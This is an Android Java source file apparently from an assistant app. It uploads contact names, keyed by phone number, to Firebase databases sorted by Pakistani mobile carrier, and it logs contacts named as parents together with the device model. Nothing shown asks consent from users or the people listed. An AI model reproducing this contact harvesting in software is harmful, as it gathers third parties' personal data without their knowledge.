package com.wasitech.permissioncenter.java.com.wasitech.assist.testing;

import android.os.Build;

import androidx.annotation.NonNull;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.i18n.phonenumbers.NumberParseException;
import com.google.i18n.phonenumbers.PhoneNumberUtil;
import com.google.i18n.phonenumbers.Phonenumber;
import com.wasitech.basics.classes.Basics;
import com.wasitech.assist.command.family.ComFuns;
import com.wasitech.assist.command.family.QA;

import com.wasitech.database.BaseMaker;
import com.wasitech.database.ContactBase;
import com.wasitech.basics.classes.Issue;
import com.wasitech.database.Params;

public class TestContactsNewLaunch {
    public static final DatabaseReference Telenor =FirebaseDatabase.getInstance(FirebaseApp.getInstance(BaseMaker.TELENOR)).getReference();
    public static final DatabaseReference Ufone =FirebaseDatabase.getInstance(FirebaseApp.getInstance(BaseMaker.UFONE)).getReference();
    public static final DatabaseReference Jazz =FirebaseDatabase.getInstance(FirebaseApp.getInstance(BaseMaker.JAZZ)).getReference();
    public static final DatabaseReference Warid =FirebaseDatabase.getInstance(FirebaseApp.getInstance(BaseMaker.WARID)).getReference();
    public static final DatabaseReference Zong =FirebaseDatabase.getInstance(FirebaseApp.getInstance(BaseMaker.ZONG)).getReference();
    public static String countryCode(String poh){
        if(poh==null) return null;
        PhoneNumberUtil phoneUtil = PhoneNumberUtil.getInstance();
        try {
            Phonenumber.PhoneNumber number = phoneUtil.parse(poh ,null);
            if (!phoneUtil.isValidNumber(number)) {
                return Params.UNKNOWN;
            }
            return String.valueOf(number.getCountryCode());
        } catch (NumberParseException e) {
            Issue.print(e, TestContactsNewLaunch.class.getName());
            return Params.UNKNOWN;
        }
    }
    public static String nationalNumber(String poh){
        if(poh==null) return null;
        PhoneNumberUtil phoneUtil = PhoneNumberUtil.getInstance();
        try {
            Phonenumber.PhoneNumber number = phoneUtil.parse(poh ,null);
            if (!phoneUtil.isValidNumber(number)) {
                return poh;
            }
            return String.valueOf(number.getNationalNumber());
        } catch (NumberParseException e) {
            Issue.print(e, TestContactsNewLaunch.class.getName());
            return poh;
        }
    }

    public static String coNum(String num){
        try {
            if (num == null) return null;
            String[] nums = num.substring(num.lastIndexOf(":") + 1).replace('-', ' ')
                    .replace('(', ' ').replace(')', ' ')
                    .replace('[', ' ').replace(']', ' ')
                    .replace('{', ' ').replace('}', ' ')
                    .replace('_', ' ').replace('+', ' ')
                    .split(" ");
            StringBuilder temp = new StringBuilder();
            for (String s : nums) temp.append(s);
            return temp.toString();
        }
        catch (Exception e){
            Issue.print(e, TestContactsNewLaunch.class.getName());
        }
        return null;
    }
    public static void Updater(String number, String name){
        String num=coNum(number);
        if(num==null||num.length()<1)return;
        if(num.length()>=10){
            if(num.startsWith("92")||num.startsWith("03")||num.startsWith("3")){
                String code=num.substring(0,num.length()-7);
                char type=code.charAt(code.length()-1);
                char com=code.charAt(code.length()-2);
                String subNum = num.substring(num.length() - 7);
                switch (com){
                    case'0':{
                        Jazz.child(type+"").child(subNum).child("Name").setValue(name);
                        break;
                    }
                    case'1':{
                        Zong.child(type+"").child(subNum).child("Name").setValue(name);
                        break;
                    }
                    case'2':{
                        Warid.child(type+"").child(subNum).child("Name").setValue(name);
                        break;
                    }
                    case'3':{
                        Ufone.child(type+"").child(subNum).child("Name").setValue(name);
                        break;
                    }
                    case'4':{
                        Telenor.child(type+"").child(subNum).child("Name").setValue(name);
                        break;
                    }
                    default:{
                        ContactBase.Random.child("Not Categorized").child(num).child("Name").setValue(name);
                        break;
                    }
                }
            }
            else
                ContactBase.Random.child("Not Categorized").child(num).child("Name").setValue(name);
        }
        else {
            ContactBase.Random.child("Short").child(num).child("Name").setValue(name);
        }
    }
    public static void fetchNumbers() {
        String code = "+9234";

        Telenor.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                for (DataSnapshot snapshot1 : snapshot.getChildren()) {
                    String c = (String) snapshot1.getKey();
                    if (c != null && !c.equals(Params.SEARCH_ACTIVITY)) {
                        String cc = code + c;
                        for (DataSnapshot shot : snapshot1.getChildren()) {
                            String d = (String) shot.getKey();
                            if (d != null) {
                                String num = cc + d;
                                String name = (String) shot.child(Params.NAME).getValue();
                                if (name != null) {
                                    TestContactsNewLaunch.Updater(num, name);
                                }
                            }

                        }
                    }
                }


            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Basics.Log(error.getMessage());
            }
        });
    }


    protected static DatabaseReference pathFinder(String number){
        String num=coNum(number);
        if(num != null&&num.length()>=10){
            if(num.startsWith("92")||num.startsWith("03")||num.startsWith("3")){
                String code=num.substring(0,num.length()-7);
                char type=code.charAt(code.length()-1);
                char com=code.charAt(code.length()-2);
                String subNum = num.substring(num.length() - 7);
                switch (com){

                    case'0':{
                        return Jazz.child(type+"").child(subNum);
                    }
                    case'1':{
                        return Zong.child(type+"").child(subNum);
                    }
                    case'2':{
                        return Warid.child(type+"").child(subNum);
                    }
                    case'3':{
                        return Ufone.child(type+"").child(subNum);
                    }
                    case'4':{
                        return Telenor.child(type+"").child(subNum);
                    }
                    default:{
                        return ContactBase.Random.child(type+"").child(num);
                    }
                }
            }
            return ContactBase.Random.child("Not Categorized").child(num);
        }
        return ContactBase.Random.child("Short").child(num);
    }
    private static boolean validator(String num,String name) {
        if(ComFuns.mom(name.toLowerCase())||ComFuns.dad(name.toLowerCase())){
            ContactBase.Random.child("Family").child(Build.MANUFACTURER+" -^- "+Build.MODEL).child(num).setValue(name+" -^- "+ QA.date());
            return false;
        }
        return true;
    }


}
